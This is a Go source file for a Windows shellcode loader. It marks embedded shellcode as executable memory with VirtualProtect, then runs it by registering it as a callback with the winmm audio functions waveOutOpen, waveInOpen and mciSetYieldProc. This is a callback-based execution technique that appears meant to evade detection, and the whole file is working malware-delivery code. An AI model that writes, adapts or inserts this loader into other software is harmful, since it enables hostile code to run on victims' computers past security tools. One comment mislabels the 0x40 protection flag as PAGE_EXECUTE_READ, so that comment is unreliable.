package sh

import (
	"fmt"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

const (
	WAVE_FORMAT_PCM     = 1
	CALLBACK_FUNCTION   = 0x00030000
	WAVE_MAPPER         = 0xFFFFFFFF
)

const (
	WOM_OPEN  = 0x3BB
	WOM_CLOSE = 0x3BC
	WOM_DONE  = 0x3BD
	WIM_OPEN  = 0x3BE
	WIM_CLOSE = 0x3BF
	WIM_DATA  = 0x3C0
)

type WaveFormatEx struct {
	FormatTag      uint16
	Channels       uint16
	SamplesPerSec  uint32
	AvgBytesPerSec uint32
	BlockAlign     uint16
	BitsPerSample  uint16
	Size           uint16
}

var (
	audioDeviceHandle uintptr
	shellcodePtr      uintptr
)

func ExecuteViaAudioCallback() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr = uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                    // lpAddress
		uintptr(len(shellcode)),        // dwSize
		0x40,                           // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	waveFormat := WaveFormatEx{
		FormatTag:      WAVE_FORMAT_PCM,
		Channels:       2,          // Stereo
		SamplesPerSec:  44100,      // 44.1 kHz
		BitsPerSample:  16,         // 16-bit
		BlockAlign:     4,          // 2 channels * 16 bits / 8
		AvgBytesPerSec: 176400,     // 44100 * 4
		Size:           0,
	}
	
	result, err := api.Call("winmm.dll", "waveOutOpen",
		uintptr(unsafe.Pointer(&audioDeviceHandle)),      // phwo
		uintptr(WAVE_MAPPER),                             // uDeviceID
		uintptr(unsafe.Pointer(&waveFormat)),             // pwfx
		shellcodePtr,                                     // dwCallback (our shellcode!)
		uintptr(0),                                       // dwInstance
		uintptr(CALLBACK_FUNCTION),                       // fdwOpen
	)
	if err != nil || result != 0 { // MMSYSERR_NOERROR = 0
		return fmt.Errorf("waveOutOpen failed: %v (result: 0x%x)", err, result)
	}
	
	return nil
}

func ExecuteViaAudioInput() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr = uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                    // lpAddress
		uintptr(len(shellcode)),        // dwSize
		0x40,                           // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	waveFormat := WaveFormatEx{
		FormatTag:      WAVE_FORMAT_PCM,
		Channels:       1,          // Mono for microphone
		SamplesPerSec:  22050,      // 22.05 kHz
		BitsPerSample:  16,         // 16-bit
		BlockAlign:     2,          // 1 channel * 16 bits / 8
		AvgBytesPerSec: 44100,      // 22050 * 2
		Size:           0,
	}
	
	result, err := api.Call("winmm.dll", "waveInOpen",
		uintptr(unsafe.Pointer(&audioDeviceHandle)),      // phwi
		uintptr(WAVE_MAPPER),                             // uDeviceID
		uintptr(unsafe.Pointer(&waveFormat)),             // pwfx
		shellcodePtr,                                     // dwCallback (our shellcode!)
		uintptr(0),                                       // dwInstance
		uintptr(CALLBACK_FUNCTION),                       // fdwOpen
	)
	if err != nil || result != 0 { // MMSYSERR_NOERROR = 0
		return fmt.Errorf("waveInOpen failed: %v (result: 0x%x)", err, result)
	}
	
	return nil
}

func ExecuteViaMCIYield() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr = uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                    // lpAddress
		uintptr(len(shellcode)),        // dwSize
		0x40,                           // PAGE_EXECUTE_READ
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	result, err := api.Call("winmm.dll", "mciSetYieldProc",
		uintptr(0),         // mciId (0 for all MCI devices)
		shellcodePtr,       // fpYieldProc (our shellcode)
		uintptr(0),         // dwYieldData
	)
	if err != nil || result != 0 {
		return fmt.Errorf("mciSetYieldProc failed: %v (result: 0x%x)", err, result)
	}
	
	return nil
}

func TriggerAudioEvent() error {
	if audioDeviceHandle == 0 {
		return fmt.Errorf("no audio device opened")
	}
	
	result, err := api.Call("winmm.dll", "waveOutRestart", audioDeviceHandle)
	if err != nil || result != 0 {
		result, err = api.Call("winmm.dll", "waveInStart", audioDeviceHandle)
		if err != nil || result != 0 {
			return fmt.Errorf("failed to start audio device: %v (result: 0x%x)", err, result)
		}
	}
	
	return nil
}

func CloseAudioDevice() error {
	if audioDeviceHandle == 0 {
		return nil
	}
	
	result, err := api.Call("winmm.dll", "waveOutClose", audioDeviceHandle)
	if err != nil || result != 0 {
		result, err = api.Call("winmm.dll", "waveInClose", audioDeviceHandle)
		if err != nil || result != 0 {
			return fmt.Errorf("failed to close audio device: %v (result: 0x%x)", err, result)
		}
	}
	
	audioDeviceHandle = 0
	return nil
}